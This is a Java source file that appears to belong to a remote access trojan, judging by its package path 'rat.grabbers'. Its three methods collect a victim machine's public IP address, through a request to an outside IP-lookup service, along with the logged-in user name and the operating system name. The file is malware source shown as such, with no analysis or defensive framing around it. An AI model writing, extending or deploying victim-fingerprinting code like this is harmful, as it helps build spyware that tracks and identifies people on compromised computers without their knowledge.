package me.veryobvious.rat.grabbers;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

public class misc {
    public static String getIp() {
        try {
            String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
        return ip;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    
    public static String getSysname() {
        try {
            String sysname = System.getProperty("user.name");
            return sysname;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    
    public static String getSysos() {
        try {
            String sysos = System.getProperty("os.name");
            return sysos;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
